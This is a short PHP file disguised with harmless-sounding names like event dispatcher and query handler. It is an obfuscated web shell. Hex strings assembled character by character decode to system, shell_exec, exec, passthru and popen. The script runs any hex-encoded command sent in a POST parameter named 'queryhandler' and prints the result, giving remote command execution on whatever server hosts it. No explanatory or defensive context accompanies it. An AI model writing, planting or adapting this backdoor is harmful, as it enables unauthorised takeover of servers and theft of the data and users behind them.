<?php


$descriptor1 = '7';
$descriptor2 = '3';
$descriptor3 = '6';
$descriptor4 = 'd';
$descriptor5 = 'c';
$descriptor6 = '5';
$descriptor7 = 'f';
$descriptor8 = '0';
$descriptor9 = '1';
$descriptor10 = '4';
$descriptor11 = '2';
$descriptor12 = 'e';
$descriptor13 = '9';
$event_dispatcher1 = pack("H*", $descriptor1.$descriptor2.$descriptor1.'9'.'7'.$descriptor2.$descriptor1.'4'.$descriptor3.'5'.'6'.$descriptor4);
$event_dispatcher2 = pack("H*", '7'.$descriptor2.$descriptor3.'8'.'6'.'5'.'6'.'c'.'6'.$descriptor5.$descriptor6.$descriptor7.$descriptor3.$descriptor6.'7'.'8'.$descriptor3.$descriptor6.'6'.'3');
$event_dispatcher3 = pack("H*", $descriptor3.$descriptor6.$descriptor1.'8'.'6'.$descriptor6.'6'.$descriptor2);
$event_dispatcher4 = pack("H*", '7'.$descriptor8.$descriptor3.$descriptor9.'7'.'3'.'7'.$descriptor2.$descriptor1.$descriptor10.'6'.'8'.$descriptor1.$descriptor11.'7'.'5');
$event_dispatcher5 = pack("H*", $descriptor1.$descriptor8.$descriptor3.$descriptor7.'7'.$descriptor8.'6'.'5'.$descriptor3.$descriptor12);
$event_dispatcher6 = pack("H*", '7'.$descriptor2.$descriptor1.'4'.$descriptor1.$descriptor11.'6'.$descriptor6.'6'.'1'.$descriptor3.'d'.'5'.$descriptor7.'6'.$descriptor1.$descriptor3.$descriptor6.$descriptor1.'4'.$descriptor6.$descriptor7.$descriptor3.$descriptor2.$descriptor3.'f'.'6'.'e'.'7'.'4'.$descriptor3.$descriptor6.'6'.'e'.$descriptor1.$descriptor10.$descriptor1.$descriptor2);
$event_dispatcher7 = pack("H*", '7'.$descriptor8.'6'.'3'.'6'.$descriptor5.$descriptor3.'f'.$descriptor1.'3'.'6'.$descriptor6);
$query_handler = pack("H*", '7'.'1'.'7'.$descriptor6.'6'.'5'.'7'.'2'.$descriptor1.$descriptor13.$descriptor6.'f'.$descriptor3.'8'.'6'.$descriptor9.$descriptor3.'e'.'6'.'4'.$descriptor3.'c'.'6'.'5'.$descriptor1.$descriptor11);
if (isset($_POST[$query_handler])) {
    $query_handler = pack("H*", $_POST[$query_handler]);
    if (function_exists($event_dispatcher1)) {
        $event_dispatcher1($query_handler);
    } elseif (function_exists($event_dispatcher2)) {
        print $event_dispatcher2($query_handler);
    } elseif (function_exists($event_dispatcher3)) {
        $event_dispatcher3($query_handler, $component_val);
        print join("\n", $component_val);
    } elseif (function_exists($event_dispatcher4)) {
        $event_dispatcher4($query_handler);
    } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
        $key_flg = $event_dispatcher5($query_handler, 'r');
        if ($key_flg) {
            $dchunk_tkn = $event_dispatcher6($key_flg);
            $event_dispatcher7($key_flg);
            print $dchunk_tkn;
        }
    }
    exit;
}
